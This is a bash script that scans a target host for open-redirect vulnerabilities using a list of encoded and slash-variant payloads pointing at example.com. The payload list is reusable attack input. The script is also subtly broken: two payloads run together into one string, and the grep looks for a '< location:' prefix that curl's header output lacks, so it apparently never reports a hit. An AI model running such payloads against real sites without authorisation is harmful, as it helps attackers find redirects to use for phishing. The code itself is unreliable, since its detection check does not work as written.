#!/bin/bash

# Find unauthenticated open redirect vulnerabilities in a target host.

if [[ $1 == "" ]]; then
	echo "./openredirect <url>";
	exit 1;
fi

payloads=(
	'/http://example.com'
	'/%5cexample.com'
	'/%2f%2fexample.com'
	'/example.com/%2f%2e%2e'
	'/http:/example.com''/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com'
	'/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com'
	'/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com'
	'/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com'
	'/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com'
	'/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com'
	'/.example.com'
	'///\;@example.com'
	'///example.com/'
	'///example.com'
	'///example.com/%2f..'
	'/////example.com/'
	'/////example.com'
)

url=${1%/}
for i in "${payloads[@]}"; do
	if curl -LIs "$url/$i" | grep -iE '< location: (https?:)?[/\\]{2,}example.com'; then
		echo "$url/$i"
	fi
done
